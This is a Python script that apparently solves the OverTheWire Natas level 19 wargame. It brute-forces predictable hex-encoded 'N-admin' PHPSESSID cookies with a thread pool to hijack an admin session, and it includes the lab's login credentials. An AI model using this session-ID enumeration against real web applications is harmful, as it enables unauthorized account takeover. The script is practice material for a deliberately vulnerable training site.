import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://natas19.natas.labs.overthewire.org/"
auth = ("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")

def check(i):
    s = f"{i}-admin"
    payload = s.encode().hex()
    
    cookies = {"PHPSESSID": payload}
    r = requests.get(url, cookies=cookies, auth=auth)
    
    if "Username: natas20" in r.text:
        return i, payload
    return None

with ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(check, i) for i in range(641)]

    for future in as_completed(futures):
        result = future.result()
        if result:
            i, payload = result
            print(f"[+] Found valid ID: {i}")
            print(f"[+] Payload: {payload}")
            break